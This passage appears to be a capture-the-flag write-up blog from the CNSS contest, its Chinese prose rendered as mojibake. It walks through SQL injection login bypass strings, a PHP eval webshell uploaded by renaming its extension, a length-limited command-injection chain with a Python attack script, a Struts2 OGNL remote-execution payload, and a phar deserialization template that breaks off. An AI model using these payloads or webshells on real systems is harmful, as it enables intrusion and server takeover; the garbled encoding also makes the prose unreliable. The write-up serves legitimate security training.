ç‰©å•†åº—</h2><p>è®¿é—®é¢˜ç›®åœ°å€ï¼Œæ ¹æ®æç¤ºç›´æ¥å³ä¸Šè§’è¿›å…¥ç™»å½•ç•Œé¢ï¼Œç”¨æˆ·åä¸ºadminï¼Œå°è¯•å¯†ç ä¸ºadminå¤±è´¥ï¼ˆåº”è¯¥ä¸è‡³äºå§~~</p><p>çŒœæµ‹sqlæ³¨å…¥ï¼Œè¾“å…¥ <code>1&#39;</code> å‘ç°æŠ¥é”™</p><p><img src="/posts/43716/image-20231018012052572.png" alt="sql-1"></p><p>å¯çŸ¥æ˜¯å•å¼•å·è¿‡æ»¤ï¼Œç›´æ¥å°è¯•ä¸‡èƒ½å¯†ç <code>1&#39; or &#39;1&#39;=&#39;1</code> æˆ–<code>-1&#39; or 1=1 #</code></p><p><img src="/posts/43716/image-20231018012252032.png" alt="sql-2"></p><p>èŠœæ¹–~~~</p><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;h0W_d1d_y0u_l0g1n_t0_my_4dm1n_p4n3l?&#125;</code></font></center></strong></em></p><h2 id="Easy-ğŸ¥µ-2048"><a href="#Easy-ğŸ¥µ-2048" class="headerlink" title="[Easy] ğŸ¥µ 2048"></a>[Easy] ğŸ¥µ 2048</h2><p>è®¿é—®é¢˜ç›®åœ°å€ï¼Œ<del>å˜¿å˜¿ç›´æ¥å¼€ç©ï¼Œä¸å°±1000000åˆ†å—</del></p><p>è€è§„çŸ©F12çœ‹çœ‹ï¼Œ<del>æ¬¸æ€ä¹ˆæŠŠé”®ç›˜æŒ‰çˆ†äº†éƒ½æ²¡ååº”</del>ï¼Œè¿‡æ»¤äº†åŠŸèƒ½é”®åŒºï¼Œå†è¯•è¯•<code>Ctrl+Shift+I</code>æˆ–<code>Ctrl+Shift+C</code>æˆåŠŸæ‰“å¼€</p><p><img src="/posts/43716/image-20231018012957354.png" alt="2048-1"></p><p>å¯ä»¥çœ‹åˆ°è°ƒç”¨getflag()å‡½æ•°æ¥è·å–flag</p><p><img src="/posts/43716/image-20231018014010920.png" alt="2048-2"></p><p><code>Ctrl+F</code> å¼€æœå‘ç°åœ¨<code>main2048.js</code>é‡Œï¼Œä½†æ˜¯åŠ å¯†äº†ï¼ˆå“­</p><p>ç®€å•å¾€ä¸‹æ‰«ä¸€ä¸‹æ²¡å‘ç°å•¥ï¼Œå¥½å¥½å¥½ï¼Œå›å»ç½‘é¡µçœ‹çœ‹ï¼Œå‘ç°scoreå€¼ä¼šå˜åŒ–ï¼Œé‚£jsä¸­å¿…ç„¶æœ‰å‡½æ•°åœ¨ä½¿å…¶æ›´æ–°</p><p><img src="/posts/43716/image-20231018014407920.png" alt="2048-3"></p><p>åœ¨jsä¸­æœ<code>score</code>ï¼Œå‘ç°<code>updateScore()</code>å‡½æ•°ï¼Œæ§åˆ¶å°å°è¯•<code>updateScore(1000001)</code>ï¼Œå‘ç°è™½ç„¶æ•°å€¼æ”¹å˜äº†ï¼Œä½†ç‚¹flagä»ç„¶ä¸è¡Œï¼ˆè¿™ä¸æ˜¯æ©è€³ç›—é“ƒå—~~</p><p>åœ¨å…¶ä»–å‡½æ•°æœscoreï¼Œå‘ç°scoreä¸ºå…¨å±€å®šä¹‰çš„å˜é‡ï¼Œæ¯æ¬¡åŠ åˆ†éƒ½ä¼šéšç€æ›´æ–°ï¼Œå˜¿å˜¿ï¼Œé‚£ä¸ç›´æ¥æ§åˆ¶å°æ”¹ä¸€ä¸‹å°±å¥½äº†</p><p><img src="/posts/43716/image-20231018015007695.png" alt="2048-4"></p><p>å†ç‚¹flagï¼Œå‘ç°æˆåŠŸå•¦ï¼Œå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ</p><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;3asy_fr0nt_kn0wledge&#125;</code></font></center></strong></em></p><h2 id="Easy-ğŸ‘¤-æ¢ä¸ªå¤´åƒå…ˆ"><a href="#Easy-ğŸ‘¤-æ¢ä¸ªå¤´åƒå…ˆ" class="headerlink" title="[Easy] ğŸ‘¤ æ¢ä¸ªå¤´åƒå…ˆ"></a>[Easy] ğŸ‘¤ æ¢ä¸ªå¤´åƒå…ˆ</h2><p>è®¿é—®é¢˜ç›®åœ°å€ï¼Œå³ä¸Šè§’éšä¾¿æ³¨å†Œä¸€ä¸‹ï¼Œç™»å½•ï¼Œå‘ç°è¦è®©æˆ‘ä»¬æ¢å¤´åƒ</p><p>åº”è¯¥æ˜¯æ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œä¸€å¥è¯æœ¨é©¬å¯åŠ¨ï¼Œ</p><p><code>&lt;?php @eval($_POST[1]);?&gt;</code>å†™å…¥æ–‡ä»¶ï¼Œå¹¶æ”¹åç¼€ä¸ºjpg</p><p>BurpSuiteå¯åŠ¨ï¼Œå¼€å¯ä»£ç†æŠ“åŒ…ï¼Œä¸Šä¼ jpg</p><p><img src="/posts/43716/image-20231018231323142.png" alt="upload-1"></p><p>å°†åç¼€æ”¹ä¸º<code>php</code>ï¼ˆå¦‚æœæœ‰è¿‡æ»¤å¯ä»¥å°è¯•<code>php2</code>,<code>php3</code>,<code>php4</code>,<code>php5</code>,<code>phtml</code>,ä»¥åŠå¤§å°å†™å’Œå¤å†™ç­‰å…¶ä»–</p><p><img src="/posts/43716/image-20231018231853632.png" alt="upload-2"></p><p>æ”¾è¡Œï¼Œå¹¶æŸ¥çœ‹httpå†å²è®°å½•æŸ¥çœ‹ä¸Šä¼ ç›®å½•</p><p><img src="/posts/43716/image-20231018232023920.png" alt="upload-3"></p><p>ç„¶åèšå‰‘å¯åŠ¨</p><p><img src="/posts/43716/image-20231018232249862.png" alt="upload-4"></p><p>getshellï¼Œè®¿é—®æ ¹ç›®å½•å¾—åˆ°flag</p><p><img src="/posts/43716/image-20231018232349889.png" alt="upload-5"></p><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;D4ng3r0us_F1l3_Up10ad!&#125;</code></font></center></strong></em></p><h2 id="Mid-7ï¸âƒ£-EZRCCCCE"><a href="#Mid-7ï¸âƒ£-EZRCCCCE" class="headerlink" title="[Mid] 7ï¸âƒ£ EZRCCCCE"></a>[Mid] 7ï¸âƒ£ EZRCCCCE</h2><p>è®¿é—®é¢˜ç›®åœ°å€</p><p><img src="/posts/43716/image-20231018232631239.png" alt="rce-1"></p><p>è§‚å¯Ÿä»£ç ï¼Œfilterå‡½æ•°ä¸­åšäº†è¿‡æ»¤ï¼Œæ¥ä¸‹æ¥çš„ä»£ç å¯¹Getçš„å†…å®¹åšäº†é•¿åº¦é™åˆ¶ï¼Œç¬¬ä¸€çœ¼æ²¡è§è¿‡ï¼Œå¼€æœï¼ŒæŸ¥é˜…å¾—çŸ¥ï¼Œlinuxä¸­å¯ä»¥åœ¨æ²¡æœ‰å†™å®Œçš„å‘½ä»¤åé¢åŠ \ï¼Œå¯ä»¥å°†ä¸€æ¡å‘½ä»¤å†™åœ¨å¤šè¡Œä¸­</p><p>æ¯”å¦‚ä¸€æ¡å‘½ä»¤cat flagå¯ä»¥å¦‚ä¸‹è¡¨ç¤º</p><p><img src="/posts/43716/image-20231018233553058.png" alt="rce-2"></p><p>åŒæ—¶æŠŠå‘½ä»¤ä¸€è¡Œä¸€è¡Œå†™è¿›æ–‡æœ¬ä¸­ä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œçš„</p><p><img src="/posts/43716/image-20231018235251293.png" alt="rce-3"></p><p>æ³¨æ„æ˜¯<code>\\</code>ï¼Œå› ä¸ºè¦é˜²æ­¢è¢«è½¬ä¹‰</p><p>ä»¥åŠ<code>&gt;&gt;</code>å’Œ<code>&gt;</code>çš„åŒºåˆ«ï¼š</p><p><strong>&gt;&gt; æ˜¯è¿½åŠ å†…å®¹ &gt;&#96; æ˜¯è¦†ç›–åŸæœ‰å†…å®¹</strong></p><p>äºæ˜¯ç½‘ä¸Šæ‰¾äº†ä¸ªè„šæœ¬ï¼ˆæˆ‘æ‰ä¸æ˜¯è„šæœ¬å°å­å‘¢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]); <span class="hljs-comment"># éœ€è¦å†™å…¥çš„ä¸€å¥è¯æœ¨é©¬</span><br><br>PD9waHAgZXZhbCgkX0dFVFsxXSk7 <span class="hljs-comment"># base64ç¼–ç å</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php # ç»„åˆä¸€ä¸‹<br></code></pre></td></tr></table></figure><p>payload.txt:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">hp</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">1.p\\</span><br><span class="language-bash">&gt;d\&gt;\\</span><br><span class="language-bash">&gt;\ -\\</span><br><span class="language-bash">&gt;e64\\</span><br><span class="language-bash">&gt;bas\\</span><br><span class="language-bash">&gt;7\|\\</span><br><span class="language-bash">&gt;XSk\\</span><br><span class="language-bash">&gt;Fsx\\</span><br><span class="language-bash">&gt;dFV\\</span><br><span class="language-bash">&gt;kX0\\</span><br><span class="language-bash">&gt;bCg\\</span><br><span class="language-bash">&gt;XZh\\</span><br><span class="language-bash">&gt;AgZ\\</span><br><span class="language-bash">&gt;waH\\</span><br><span class="language-bash">&gt;PD9\\</span><br><span class="language-bash">&gt;o\ \\</span><br><span class="language-bash">&gt;ech\\</span><br><span class="language-bash"><span class="hljs-built_in">ls</span> -t&gt;0</span><br>sh 0<br></code></pre></td></tr></table></figure><p>ls -tæ˜¯æ ¹æ®æ—¶é—´é¡ºåºæŠŠæ–‡ä»¶ååˆ—å‡ºæ¥ï¼Œåˆšå¥½æ»¡è¶³æˆ‘ä»¬éœ€æ±‚ï¼Œä½†æ³¨æ„ï¼š<strong>æ˜¯å€’åº</strong>ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆ<code>payload.txt</code>ä¸­çš„å‘½ä»¤æ˜¯åçš„äº†</p><p>pythonè„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://124.221.34.13:55559/?6=&#123;0&#125;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]start attack!!!&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]&quot;</span> + url.<span class="hljs-built_in">format</span>(i.strip()))<br>        requests.get(url.<span class="hljs-built_in">format</span>(i.strip()))<br><br><span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦æ”»å‡»æˆåŠŸ</span><br>test = requests.get(<br>    <span class="hljs-string">&quot;http://124.221.34.13:55559/sandbox/d178dace7559b986abd1b832eabef837/1.php&quot;</span><br>)<br><span class="hljs-keyword">if</span> test.status_code == requests.codes.ok:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]Attack success!!!&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>è¿™è¾¹è¿˜æœ‰ä¸ªå°ç‚¹ï¼Œä¹Ÿå°±æ˜¯é‚£ä¸ªsandboxçš„ç›®å½•å</p><p><img src="/posts/43716/image-20231018235956427.png" alt="rce-4"></p><p>å› ä¸ºé™åˆ¶8ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é€šè¿‡<code>ls ..</code>æ¥è·å¾—</p><p><img src="/posts/43716/image-20231019001329749.png" alt="rce-5"></p><p>ç„¶åå°±å¯ä»¥æ‹¼æ¥åœ°å€</p><p><code>http://124.221.34.13:55559/sandbox/0eea99a28b6e985ffbe584f98dd999b7/1.php</code></p><p>å› ä¸ºå‰é¢æœ¨é©¬æ˜¯GETå½¢å¼æ‰€ä»¥ç›´æ¥è®¿é—®</p><p><code>http://124.221.34.13:55559/sandbox/0eea99a28b6e985ffbe584f98dd999b7/1.php?1=system(&#39;ls /&#39;);</code></p><p>ï¼ˆ<strong>æ³¨æ„åˆ†å·åˆ«å¿˜äº†</strong></p><p><img src="/posts/43716/image-20231019001809761.png" alt="rce-6"></p><p><code>http://124.221.34.13:55559/sandbox/0eea99a28b6e985ffbe584f98dd999b7/1.php?1=system(&#39;cat /flag&#39;);</code>å¾—åˆ°flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;y0u_kn0w_h0w_7o_k22p_fit&#125;</code></font></center></strong></em></p><h2 id="Mid-ğŸ±-Tomcat-cat"><a href="#Mid-ğŸ±-Tomcat-cat" class="headerlink" title="[Mid] ğŸ± Tomcat?cat~"></a>[Mid] ğŸ± Tomcat?cat~</h2><p>å˜¿å˜¿ï¼Œè¿™é¢˜å½“æ—¶æƒ³äº†å¥½ä¹…ï¼Œåé¢æ‰å‘ç°ç½‘é¡µæ ‡é¢˜æœ‰æç¤º<strong>Struct2</strong>ï¼Œå¼€æœ</p><p>ä½†æ˜¯çœ‹äº†åŠå¤©å…¶å®ä¹Ÿæ²¡çœ‹å¤ªæ‡‚ï¼Œè¿™é‡Œè´´ä¸€ä¸‹åˆ«äººçš„åŸç†è§£é‡Š</p><blockquote><p>Struts 2 æ¡†æ¶çš„è¡¨å•éªŒè¯æœºåˆ¶ï¼ˆ Validation ï¼‰ä¸»è¦ä¾èµ–äºä¸¤ä¸ªæ‹¦æˆªå™¨ï¼švalidation å’Œ workflowã€‚validation æ‹¦æˆªå™¨å·¥ä½œæ—¶ï¼Œä¼šæ ¹æ® XML é…ç½®æ–‡ä»¶æ¥åˆ›å»ºä¸€ä¸ªéªŒè¯é”™è¯¯åˆ—è¡¨ï¼›workflow æ‹¦æˆªå™¨å·¥ä½œæ—¶ï¼Œä¼šæ ¹æ® validation æ‹¦æˆªå™¨æ‰€æä¾›çš„éªŒè¯é”™è¯¯åˆ—è¡¨ï¼Œæ¥æ£€æŸ¥å½“å‰æ‰€æäº¤çš„è¡¨å•æ˜¯å¦å­˜åœ¨éªŒè¯é”™è¯¯ã€‚</p><p>åœ¨é»˜è®¤é…ç½®ä¸‹ï¼Œå¦‚æœ workflow æ‹¦æˆªå™¨æ£€æµ‹åˆ°ç”¨æˆ·æ‰€æäº¤çš„è¡¨å•å­˜åœ¨ä»»ä½•ä¸€ä¸ªéªŒè¯é”™è¯¯ï¼Œworkflow æ‹¦æˆªå™¨éƒ½ä¼šå°†ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè§£æå¤„ç†ï¼Œéšå³è¿”å›å¹¶æ˜¾ç¤ºå¤„ç†ç»“æœã€‚</p><p>Struts 2 æ¡†æ¶ä¸­çš„ä¸€ä¸ªæ ‡ç­¾å¤„ç†åŠŸèƒ½ï¼š altSyntax</p><p>altSyntax åŠŸèƒ½æ˜¯ Struts 2 æ¡†æ¶ç”¨äºå¤„ç†æ ‡ç­¾å†…å®¹çš„ä¸€ç§æ–°è¯­æ³•ï¼ˆä¸åŒäºæ™®é€šçš„ HTML ï¼‰ï¼Œè¯¥åŠŸèƒ½ä¸»è¦ä½œç”¨åœ¨äºæ”¯æŒå¯¹æ ‡ç­¾ä¸­çš„ OGNL è¡¨è¾¾å¼è¿›è¡Œè§£æå¹¶æ‰§è¡Œã€‚</p><p>altSyntax åŠŸèƒ½åœ¨å¤„ç†æ ‡ç­¾æ—¶ï¼Œå¯¹ OGNL è¡¨è¾¾å¼çš„è§£æèƒ½åŠ›å®é™…ä¸Šæ˜¯ä¾èµ–äºå¼€æºç»„ä»¶ XWorkã€‚</p><p>äºæ˜¯ï¼Œåœ¨ XWork ç»„ä»¶ç‰ˆæœ¬å°äº 2.0.4 ä»¥åŠ altSyntax åŠŸèƒ½å¼€å¯çš„æƒ…å†µä¸‹ï¼Œæ¶æ„æ”»å‡»è€…å¯ä»¥é€šè¿‡æäº¤ä¸€ä¸ªå¸¦æœ‰ OGNL è¡¨è¾¾å¼çš„è¡¨å•è¯·æ±‚ï¼Œæ•…æ„è§¦å‘è¡¨å•éªŒè¯é”™è¯¯â€”â€”æœ€ç»ˆè¯¥è¡¨å•è¯·æ±‚ä¸­æ¶æ„çš„ OGNL è¡¨è¾¾å¼ä¼šè¢« XWork ç»„ä»¶è§£æå¹¶æ‰§è¡Œï¼Œéšå³ç”± workflow æ‹¦æˆªå™¨è¿”å›æ‰§è¡Œç»“æœã€‚</p></blockquote><p>å†è´´ä¸€ä¸ªæ‰¾åˆ°çš„expï¼Œç¨å¾®ä¿®æ”¹ä¸‹å¯¹åº”å‘½ä»¤å°±èƒ½æ‰¾åˆ°flagäº†ï¼š</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">?age=<span class="hljs-meta">%27</span>+<span class="hljs-meta">%2B</span>+<span class="hljs-meta">%28</span><span class="hljs-meta">%23_memberAccess</span><span class="hljs-meta">%5B</span><span class="hljs-meta">%22allowStaticMethodAccess</span><span class="hljs-meta">%22</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%3Dtrue</span><span class="hljs-meta">%2C</span><span class="hljs-meta">%23foo</span><span class="hljs-meta">%3Dnew</span>+java<span class="hljs-built_in">.lang</span>.Boolean<span class="hljs-meta">%28</span><span class="hljs-meta">%22false</span><span class="hljs-meta">%22</span><span class="hljs-meta">%29</span>+<span class="hljs-meta">%2C</span><span class="hljs-meta">%23context</span><span class="hljs-meta">%5B</span><span class="hljs-meta">%22xwork</span>.MethodAccessor.denyMethodExecution<span class="hljs-meta">%22</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%23foo</span><span class="hljs-meta">%2C</span><span class="hljs-meta">%40org</span>.apache.commons.io.IOUtils<span class="hljs-meta">%40toString</span><span class="hljs-meta">%28</span><span class="hljs-meta">%40java</span><span class="hljs-built_in">.lang</span>.Runtime<span class="hljs-meta">%40getRuntime</span><span class="hljs-meta">%28</span><span class="hljs-meta">%29</span>.exec<span class="hljs-meta">%28</span><span class="hljs-meta">%27ls</span> webapps/flaaaaaaag<span class="hljs-meta">%27</span><span class="hljs-meta">%29</span>.getInputStream<span class="hljs-meta">%28</span><span class="hljs-meta">%29</span><span class="hljs-meta">%29</span><span class="hljs-meta">%29</span>+<span class="hljs-meta">%2B</span>+<span class="hljs-meta">%27</span><br></code></pre></td></tr></table></figure><p>è‡³äºä¸ºä»€ä¹ˆé€‰æ‹©ageï¼Œå› ä¸ºé€ä¸ªå°è¯•åªæœ‰ä»–å›æ˜¾äº†</p><p><em><strong>TODOï¼šæ‰ç–å­¦æµ…ï¼Œä»¥åæœ‰ç©ºå†æ¥ç†è§£ä¸€é</strong></em></p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;t0mcat_1s_4_cute_cat_m1a0&#125;</code></font></center></strong></em></p><h2 id="Mid-ğŸ”§-where-is-my-unserialize"><a href="#Mid-ğŸ”§-where-is-my-unserialize" class="headerlink" title="[Mid] ğŸ”§ where is my unserialize?"></a>[Mid] ğŸ”§ where is my unserialize?</h2><p>è¿™é¢˜ä¹Ÿç£¨äº†å¥½ä¹…ï¼Œè®¿é—®é¢˜ç›®ï¼Œåˆ°å¤„ç‚¹ç‚¹</p><p>å‘ç°æŸ¥çœ‹æ–‡ä»¶å¯ä»¥æŸ¥çœ‹æºç ï¼Œé‚£å°±ä¸€ä¸ªä¸ªè¯•ä¸‹</p><p>index.php:</p><p><img src="/posts/43716/image-20231019005106778.png" alt="image-20231019005106778"></p><p>base.php:<img src="/posts/43716/image-20231019005332254.png" alt="image-20231019005332254"></p><p>upload_file.php:<img src="/posts/43716/image-20231019005437122.png" alt="image-20231019005437122"></p><p>file.php:</p><p><img src="/posts/43716/image-20231019005500258.png" alt="image-20231019005500258"></p><p>function.php:<img src="/posts/43716/image-20231019005529014.png" alt="image-20231019005529014"></p><p>class.php:<img src="/posts/43716/image-20231019005718896.png" alt="image-20231019005718896"></p><p><img src="/posts/43716/image-20231019005731143.png" alt="image-20231019005731143"></p><p><img src="/posts/43716/image-20231019005753405.png" alt="image-20231019005753405"></p><p>æœ‰ç‚¹å¤šã€‚ã€‚ã€‚</p><p>è¿™ä¹Ÿæ˜¯æˆ‘ä¹‹å‰æ²¡è§è¿‡çš„é¢˜ï¼Œç”¨åˆ°äº†<strong>phar</strong>ï¼Œæœ¬æ¥æƒ³ç½‘ä¸Šæ‰¾ä¸ªæ¨¡æ¿å¥—ä¸€ä¸‹è¯•è¯•ï¼Œç»“æœæˆåŠŸäº†</p><p>è´´ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CNSS</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shin0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    public function __construct($name)</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $this-&gt;name=$name;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    public function __wakeup()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $this-&gt;shin0 = &#x27;cnss&#x27;;</span><br><span class="hljs-comment">        $this-&gt;_sayhello();</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function _sayhello()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        echo (&#x27;&lt;h1&gt;I know you are in a hurry, but don not rush yet.&lt;h1&gt;&#x27;);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    public function __destruct()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $this-&gt;shin0 = $this-&gt;name;</span><br><span class="hljs-comment">        echo $this-&gt;shin0.&#x27;&lt;br&gt;&#x27;;</span><br><span class="hljs-comment">    &#125;*/</span><br>&#125;<br><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CN55</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    public function __construct()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $this-&gt;params = array();</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function __invoke()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        return $this-&gt;_get(&#x27;key&#x27;);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function _get($key)</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="hljs-comment">            $value = $this-&gt;params[$key];</span><br><span class="hljs-comment">        &#125; else &#123;</span><br><span class="hljs-comment">            $value = &quot;index.php&quot;;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        return $this-&gt;file_get($value);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function file_get($value)</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $text = base64_encode(file_get_contents($value));</span><br><span class="hljs-comment">        return $text;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    */</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$haha</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    public function __construct($file)</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $this-&gt;key = $file;</span><br><span class="hljs-comment">        echo $this-&gt;key.&#x27;&lt;br&gt;&#x27;;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function __toString()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $func = $this-&gt;haha[&#x27;hehe&#x27;];</span><br><span class="hljs-comment">        return $func();</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function __call($key,$value)</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        $this-&gt;$key = $value;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    public function _show()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        if(preg_match(&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;,$this-&gt;source)) &#123;</span><br><span class="hljs-comment">            die(&#x27;&lt;h1&gt;hackerrrrrr!&lt;br&gt;join CNSS~&lt;h1&gt;&#x27;);</span><br><span class="hljs-comment">        &#125; else &#123;</span><br><span class="hljs-comment">            highlight_file($this-&gt;source);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public function __wakeup()</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;   //Do you know &#x27;Php ARchive&#x27;?</span><br><span class="hljs-comment">            echo &quot;hacker~&quot;;</span><br><span class="hljs-comment">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    